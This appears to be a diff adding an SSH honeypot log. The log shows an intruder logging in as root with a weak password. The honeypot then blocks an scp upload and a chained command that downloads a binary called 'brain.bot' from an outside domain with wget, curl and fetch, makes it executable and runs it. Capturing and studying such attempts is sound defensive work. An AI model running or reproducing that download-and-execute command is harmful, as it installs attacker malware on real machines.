@@ -1,0 +1,11 @@
+20170328_011414_978460 - [POT  ] network1 - 192.168.5.2:22
+20170328_011414_978460 - [SSH  ] Incoming Connection from 24.18.205.49:40759 - United States
+20170328_011415_243582 - [SSH  ] Login Successful: root:123321
+20170328_011415_243582 - [SSH  ] Login was spoofed
+20170328_011417_730732 - [EXEC43] Opened Channel
+20170328_011417_789683 - [EXEC43] Command Blocked: scp -t -r .lsd
+20170328_011417_842503 - [EXEC43] Closed Channel
+20170328_011418_105382 - [EXEC44] Opened Channel
+20170328_011418_201326 - [EXEC44] Command Blocked: wget ugotownedz.org/brain.bot;chmod +x brain.bot;./brain.bot;rm -rf brain.bot;curl -O ugotownedz.org/brain.bot && chmod +x brain.bot && ./brain.bot;fetch ugotownedz.org/brain.bot && chmod +x brain.bot && ./brain.bot
+20170328_011418_331515 - [EXEC44] Closed Channel
+20170328_011428_505341 - [SSH  ] Lost Connection with 24.18.205.49
